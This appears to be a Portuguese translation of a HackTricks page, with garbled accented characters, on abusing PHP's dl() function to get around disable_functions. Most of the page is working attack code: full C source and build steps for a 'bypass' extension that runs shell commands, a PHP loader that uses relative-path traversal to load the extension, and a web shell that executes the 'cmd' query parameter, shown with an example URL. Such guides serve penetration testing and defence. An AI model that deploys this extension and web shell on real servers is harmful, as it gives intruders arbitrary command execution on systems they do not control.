<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Nota importante:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** √© uma fun√ß√£o PHP que pode ser usada para carregar extens√µes PHP. Se a fun√ß√£o n√£o estiver desativada, ela pode ser abusada para **burlar `disable_functions` e executar comandos arbitr√°rios**.\
No entanto, ela tem algumas limita√ß√µes estritas:

* A fun√ß√£o `dl` deve estar **presente** no **ambiente** e **n√£o desativada**
* A Extens√£o PHP **deve ser compilada com a mesma vers√£o principal** (vers√£o da API PHP) que o servidor est√° usando (voc√™ pode ver essa informa√ß√£o na sa√≠da do phpinfo)
* A Extens√£o PHP deve estar **localizada no diret√≥rio** que √© **definido** pela diretiva **`extension_dir`** (voc√™ pode ver isso na sa√≠da do phpinfo). √â muito improv√°vel que um atacante tentando abusar do servidor tenha acesso de escrita a este diret√≥rio, ent√£o esse requisito provavelmente impedir√° que voc√™ abuse desta t√©cnica).

**Se voc√™ atender a esses requisitos, continue lendo este post copiado de** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **para aprender como burlar disable\_functions**

Quando o administrador estava configurando o servidor, ele/ela n√£o desativou a [fun√ß√£o dl](http://www.php.net/manual/en/function.dl.php) pois n√£o havia men√ß√£o de ser capaz de executar comandos do sistema.\
A [fun√ß√£o dl](http://www.php.net/manual/en/function.dl.php) √© usada para carregar extens√µes PHP quando um script √© executado.\
\
(Extens√µes PHP s√£o escritas em C/C++ e s√£o usadas para dar mais funcionalidade ao PHP.)\
\
O atacante percebe que a fun√ß√£o n√£o est√° desativada e v√™ potencial e decide criar uma extens√£o PHP.\
O atacante verifica a vers√£o do PHP usando um pequeno script `<?php echo 'PHP Version is '.PHP_VERSION; ?>` (PHP\_VERSION √© uma constante predefinida que cont√©m o n√∫mero da vers√£o do PHP.)\
\
O atacante anota a vers√£o e baixa o tarball do [site do PHP](http://www.php.net/downloads.php), neste cen√°rio a vers√£o √© mais antiga que o lan√ßamento atual ent√£o o atacante tem que ir ao [arquivo](http://museum.php.net).\
\
Em seguida, ele extrai o c√≥digo-fonte e [compila e instala](http://www.php.net/manual/en/install.php) a vers√£o do PHP em sua pr√≥pria m√°quina.\
\
Agora √© hora de criar a extens√£o\
O atacante l√™ sobre [criar extens√µes PHP](http://www.php.net/manual/en/zend.creating.php) no site do PHP.\
Depois de ler a documenta√ß√£o e criar algumas extens√µes por conta pr√≥pria, ele decide olhar para o c√≥digo-fonte do PHP, j√° que a fun√ß√£o que ele est√° procurando j√° est√° criada.\
\
A fun√ß√£o que ser√° duplicada ser√° a [fun√ß√£o exec](http://www.php.net/manual/en/function.exec.php)\
no c√≥digo-fonte est√° localizada em ext/standard/exec.c\
\
As partes relevantes s√£o implementadas em uma nova extens√£o pr√≥pria.\
\

**Notas:**

Antes de come√ßar a compilar os c√≥digos, voc√™ deve estar ciente de dois pontos:

1- O valor de `ZEND_MODULE_API_NO` deve ser alterado no arquivo `bypass.c` para o atual `Zend Extension Build` em que voc√™ est√° trabalhando, voc√™ pode obt√™-lo usando a linha de comando abaixo:
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- Se voc√™ encontrou algum erro ao compilar o arquivo bypass.c na vers√£o recente do PHP (5, 7 e 8), voc√™ pode alterar o PHP_FUNCTION(bypass_exec) para isto:
```
PHP_FUNCTION(bypass_exec)
{
FILE *in;
char *command;
size_t command_len;
zend_string *ret;
php_stream *stream;

ZEND_PARSE_PARAMETERS_START(1, 1)
Z_PARAM_STRING(command, command_len)
ZEND_PARSE_PARAMETERS_END();

if (!command_len) {
zend_argument_value_error(1, "cannot be empty");
RETURN_THROWS();
}
if (strlen(command) != command_len) {
zend_argument_value_error(1, "must not contain any null bytes");
RETURN_THROWS();
}

#ifdef PHP_WIN32
if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
RETURN_FALSE;
}

stream = php_stream_fopen_from_pipe(in, "rb");
ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
php_stream_close(stream);

if (ret && ZSTR_LEN(ret) > 0) {
RETVAL_STR(ret);
}
}
```
Os arquivos para a extens√£o separada acabam como abaixo:

{% code title="bypass.c" %}
```c
/*
+----------------------------------------------------------------------+
| Copyright (c) 1997-2003 The PHP Group                                |
+----------------------------------------------------------------------+
| This source file is subject to version 2.02 of the PHP license,      |
| that is bundled with this package in the file LICENSE, and is        |
| available at through the world-wide-web at                           |
| http://www.php.net/license/2_02.txt.                                 |
| If you did not receive a copy of the PHP license and are unable to   |
| obtain it through the world-wide-web, please send a note to          |
| license@php.net so we can mail you a copy immediately.               |
+----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
PHP_FE(bypass_exec, NULL)
{NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
STANDARD_MODULE_HEADER,
#endif
PHP_BYPASS_EXTNAME,
bypass_functions,
NULL,
NULL,
NULL,
NULL,
NULL,
#if ZEND_MODULE_API_NO >= 20010901
PHP_BYPASS_VERSION,
#endif
STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
FILE *in;
int readbytes, total_readbytes=0, allocated_space;
pval **cmd;
char *ret;

if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
WRONG_PARAM_COUNT;
}

convert_to_string_ex(cmd);
#ifdef PHP_WIN32
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
RETURN_FALSE;
}

allocated_space = EXEC_INPUT_BUF;
ret = (char *) emalloc(allocated_space);

while (1) {
readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
if (readbytes<=0) {
break;
}

total_readbytes += readbytes;
allocated_space = total_readbytes+EXEC_INPUT_BUF;
ret = (char *) erealloc(ret, allocated_space);
}

pclose(in);

RETVAL_STRINGL(ret, total_readbytes, 0);
Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
```markdown
{% endcode %}

{% code title="php_bypass.h" %}
```
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
```markdown
{% endcode %}

{% code title="config.m4" %}
```
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

Uma vez que os arquivos s√£o criados, √© hora de construir a extens√£o PHP.
```
phpize
./configure
make
```
Uma vez feito isso, a extens√£o compilada estar√° localizada no subdiret√≥rio modules com o nome do arquivo bypass.so.
O arquivo √© copiado para um local seguro, agora os seguintes comandos s√£o executados para limpar os arquivos rec√©m-criados.
```
make clean
phpize --clean
```
Agora o atacante faz o upload da extens√£o rec√©m-criada para o host v√≠tima.

(NOTA: Vers√µes principais do PHP usam diferentes vers√µes da API, para que voc√™ possa compilar a extens√£o em um host e fazer o upload para outro, as vers√µes da API devem coincidir. √â por isso que inicialmente a mesma vers√£o do PHP foi instalada na m√°quina do atacante.)

Para carregar uma extens√£o com a fun√ß√£o dl, a extens√£o precisa estar no diret√≥rio de extens√µes definido pela diretiva extension_dir.
Isso pode ser um problema, pois √© menos prov√°vel que o atacante tenha permiss√µes de escrita neste diret√≥rio, no entanto, h√° uma maneira de contornar isso.
Esse problema foi discutido por desenvolvedores na p√°gina da fun√ß√£o dl, na se√ß√£o de notas.

O conceito discutido √© usar um caminho relativo a partir do diret√≥rio de extens√µes definido.
Por exemplo, se o diret√≥rio de extens√µes foi definido como /usr/php/extensions e voc√™ gostaria de carregar bypass.so no diret√≥rio web atual /home/example.com/html, voc√™ faria o seguinte:
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
Este m√©todo permite contornar a necessidade de ter a extens√£o no diret√≥rio de extens√µes definido.

H√° tamb√©m uma maneira automatizada para que voc√™ n√£o precise alterar o caminho relativo para diferentes hosts, este c√≥digo foi criado por endofyourself \[at] yahoo \[dot] com e melhorado posteriormente por mag\_2000 \[at] front \[dot] ru

Havia um pequeno problema com a fun√ß√£o, em alguns hosts o diret√≥rio de extens√µes est√° definido como "./". Esta fun√ß√£o n√£o levava em conta se o diret√≥rio de extens√µes estava definido para um caminho relativo, a solu√ß√£o para isso √© usar a fun√ß√£o realpath.

O script final usado para carregar a extens√£o e executar comandos do sistema para contornar as fun√ß√µes desabilitadas √© o seguinte:
```php
<?php

function dl_local( $extensionFile ) {
if(!(bool)ini_get('enable_dl')
||(bool)ini_get('safe_mode')){
die('Loading extensions is not permitted.');
}

if(!file_exists($extensionFile)){
die('File '.$extensionFile.' does not exist.');
}

if(!is_executable($extensionFile)){
die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
}

$currentDir = getcwd().'/';
$currentExtPath = realpath(ini_get('extension_dir'));

$subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
unset($matches);

if(!(bool)$subDirs){
die('Could not determine a valid extension path [extension_dir]');
}

$extPathLastChar=strlen($currentExtPath )-1;

if($extPathLastChar==strrpos($currentExtPath,'/')){
$subDirs--;}$backDirStr = '';

for($i = 1; $i <= $subDirs; $i++){
$backDirStr .='..';
if($i != $subDirs){
$backDirStr .='/';
}
}

$finalExtPath = $backDirStr.$currentDir.$extensionFile;
if(!dl($finalExtPath)){
die();
}


$loadedExtensions = get_loaded_extensions();
$thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
$output = bypass_exec($_GET['cmd']);
echo '<pre>'.$output.'</pre>';
}
?>
```
Tudo o que o atacante precisa fazer agora para executar comandos √© chamar a URL do script junto com uma vari√°vel cmd com o comando desejado.
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga**-me no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
